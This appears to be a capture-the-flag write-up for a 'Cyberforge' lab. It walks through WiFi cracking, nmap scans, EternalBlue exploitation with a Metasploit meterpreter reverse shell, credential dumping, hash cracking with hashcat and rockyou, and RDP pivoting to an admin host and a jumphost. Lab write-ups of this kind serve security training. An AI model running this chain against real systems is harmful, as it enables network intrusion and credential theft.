# Scenario 2
Scenario 2 entailed the red teaming in the Cyberforge CTF

## Scenario 2 contains the following methodology:
  1.	Hacker finds WiFi Network “FT_Smart_Factory”
  2.	Hacker uses WIFITE to crack password
  3.	Hacker authenticates onto the Vmbr1 network
  4.	Hacker does recon and discovers devices on network
  5.	Hacker discovers Windows Server 2012 AD Server
  6.	Hacker exploits SMB Eternal Blue CVE to dump credentials
  7.	Hacker authenticates as “Admin”, allowing for access to Vmbr2
  8.	Hacker authenticates into jumphost
  9.	Hacker accesses OT
  10.	 Hacker completes CTF

## Tools and Resources used:
  1. AirCrack
  2. Nmap
  3. Metasploit Framework
  4. Meterpreter
  5. Hashcat
  6. RockYou Wordlist

## WiFi Cracking

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan1
sudo wifite -i wlan1
```

<img width="1920" height="1032" alt="image" src="https://github.com/user-attachments/assets/55352af2-e608-4fbf-a564-55e90607fd4d" />


## Reconnaissance
After gaining access to the Vmbr1 we perform the following reconnaissance
```bash
sudo nmap -sS -O -p- 192.168.0.0/24
```
This was to scan the network for hosts and to see any open ports and the operating systems.

<img width="891" height="1245" alt="Screenshot From 2026-09-15 17-31-01" src="https://github.com/user-attachments/assets/eab2ca18-5a5b-4254-a6d2-d49521f7c446" />

<img width="1969" height="1119" alt="2" src="https://github.com/user-attachments/assets/bbaa052b-6ea9-4d40-9741-478c73b6ad29" />

<img width="1969" height="1119" alt="3" src="https://github.com/user-attachments/assets/b12be7f0-f27a-43f5-8e7b-541dbaabd4c8" />

We discover a Windows Server 2012 machine on the IP '192.168.0.200'. We then performed a command in nmap to check if the Windows Server 2012 machine was vulnerable to the Eternal Blue exploit.

```bash
sudo nmap -Pn -p 445 --script smb-protocols,smb-vuln-ms17-010 192.168.0.200
```

Which then showed us that the machine was vulnerable.

<img width="1259" height="907" alt="4" src="https://github.com/user-attachments/assets/7dd5de23-bb83-498a-91b3-7d244b0ec3f6" />

## Eternal Blue Exploitation

After this we Opened Metasploit Framework.

```bash
msfconsole
```

And set the exploit as Eternal Blue:

```msfconsole
use exploit/windows/smb/ms17_010_eternalblue
```

We then set the following options:
```msfconsole
set RHOSTS 192.168.0.200
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.6
set LPORT 4444
```
So the following options were:
- RHOSTS as the Vulnerable Windows Server 2012 Machine
- The RPORT as 445 which is used for smb
- The payload as the Meterpreter reverse tcp
- The LHOST as the Kali machine
- The LPORT as port 4444

```msfconsole
check
```
This command then did one final check to confirm the machine was vulnerable to this exploit. Before then running the exploit with the command:

```msfconsole
run
```

<img width="1259" height="907" alt="5" src="https://github.com/user-attachments/assets/501eca7a-359a-4bbb-8ad0-fa811301f464" />

Once in the Windows Server 2012 CLI, we did the following command to confirm we were in:

```cmd
sysinfo
```
Once confirmed we were in the Windows Server 2012 machine we used the following command to dump all of the password hashes:

```cmd
creds_all
```

Which then gave us the hashes all all the passwords local and on the Active Directory, in particular the Administrator credential hash.

<img width="2558" height="1297" alt="6" src="https://github.com/user-attachments/assets/399322a9-c56d-4b97-8976-6a88e945a7a9" />

We then copied the hash and printed it to an admin.hash file in a separate terminal window:

```bash
printf '%s\n' 'e19ccf75ee54e06b06a5907af13cef42' > admin.hash
```

Then confirming everything was printed in the file correctly:

```bash
cat -A admin.hash
wc -c admin.hash
```

<img width="1018" height="291" alt="7" src="https://github.com/user-attachments/assets/a9a8e82b-bbf6-4d10-a92e-3976d88be0e1" />

## Cracking the Hashed Administrator Password

So before cracking the hashed password, we had to extract the rockyou wordlist:
```bash
ls /usr/share/wordlists/
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

<img width="1837" height="469" alt="8" src="https://github.com/user-attachments/assets/bfa9336b-2c3e-4269-bcce-6b5eabaf33dc" />

To which we could no crack the hashed password using the wordlist:
```bash
hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt -d 1
```

Once complete we can see the plaintext Administrator password as 'P@ssw0rd'

<img width="1751" height="1003" alt="9" src="https://github.com/user-attachments/assets/a426762d-14a1-4cb0-8bc2-4f857ccd93fc" />

<img width="1751" height="1003" alt="10" src="https://github.com/user-attachments/assets/fdae2d5c-692f-4b21-a16f-f5d3a5f1d077" />

## Connecting to Admin Computer with RDP

On KALI Linux we RDP into the Admin Computer:

```bash
sudo su
rdesktop -u administrator@CYBERFORGE.com 192.168.0.102
```

<img width="940" height="113" alt="image" src="https://github.com/user-attachments/assets/7ea2aaa7-a1b8-4d25-9c2e-8679e0ae0860" />

We then used the credentials that we got from the active directory to login

<img width="574" height="472" alt="image" src="https://github.com/user-attachments/assets/6f47ec72-06de-4333-9248-5fe8950a0072" />

<img width="363" height="298" alt="image" src="https://github.com/user-attachments/assets/03734f6d-7b4a-450a-a2f8-fdbf66bc1137" />

<img width="487" height="400" alt="image" src="https://github.com/user-attachments/assets/e3859773-7262-4672-b135-bdb8495e63f9" />

Credentials being Administrator:P@ssw0rd

Using WhoAmI to prove we on the admincomputer:

```bash
whoami
```

<img width="463" height="380" alt="image" src="https://github.com/user-attachments/assets/a402df97-3377-4b1e-9f3f-c1c2729095a7" />

In the home directory we find a plaintext file call ikeepforgettingmypasswd:
We also find flag 2
<img width="1023" height="841" alt="Screenshot From 2026-10-16 16-18-04" src="https://github.com/user-attachments/assets/eb4f1e8d-7e2d-4e58-8990-784a8d8db5aa" />


```bash
ls -la
cat ikeepforgettingmypasswd
```

Which contains some credentials JumpHost:JumpH0st2026!

## Connecting to the JumpHost using RDP

We then performed an nmap scan on the 192.168.100.0/24 network to scan for any machines.

```bash
nmap 192.168.100.0/24
```

Doing this we found an IP address 192.168.100.3 which has port 3389 open which we can also access using RDP.

<img width="847" height="696" alt="image" src="https://github.com/user-attachments/assets/d5ca37b1-c8b8-40e7-9e8f-2a2b2de2717a" />

Using the program xfreerdp we can then access this machine using the credentials we found:

```bash
xfreerdp /v:192.168.100.3 /u:jumphost /cert:ignore
```

<img width="940" height="773" alt="image" src="https://github.com/user-attachments/assets/034af935-5739-463e-b766-5cd8fc8ddf6e" />


We then use the credentials that we found in the plaintext file

<img width="780" height="641" alt="image" src="https://github.com/user-attachments/assets/666ef31d-12b1-4cea-aa93-01a9e6a4bd5b" />

After typing in the credentials again on the machines log in screen, we then have access to the system

<img width="940" height="773" alt="image" src="https://github.com/user-attachments/assets/e977f241-bbfc-404b-8b3a-b92b0333dca6" />

We can then prove where see where we are and view that we are now in the 192.168.200.0/24 network:

```bash
whoami
ip add
```

<img width="940" height="773" alt="image" src="https://github.com/user-attachments/assets/1dec9fb0-a64c-4985-b960-4bdfa77aa7f0" />











